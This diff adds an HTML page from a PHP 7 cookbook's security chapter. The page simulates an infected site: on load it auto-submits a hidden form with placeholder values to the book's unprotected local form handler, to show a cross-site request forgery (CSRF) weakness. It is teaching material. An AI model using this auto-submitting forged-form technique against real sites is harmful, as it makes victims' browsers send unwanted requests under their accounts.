@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<head>
+	<title>PHP 7 Cookbook</title>
+	<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+	<link rel="stylesheet" type="text/css" href="php7cookbook.css">
+</head>
+<body onload="load()">
+
+	<!-- simulates infected web page -->
+    <form action="/chap_12_form_unprotected.php" method="post" id="csrf_test" name="csrf_test">
+        <input name="name" type="hidden" value="No Goodnick" />
+        <input name="email" type="hidden" value="malicious@owasp.org" />
+        <input name="comments" type="hidden" value="If you see this, your form is vulnerable to CSRF attacks!" />
+        <input name="process" type="hidden" value="1" />
+    </form>
+    <script>function load() { document.forms['csrf_test'].submit(); }</script>
+	<!-- end infection simulation -->
+
+</body>
+</html>
+
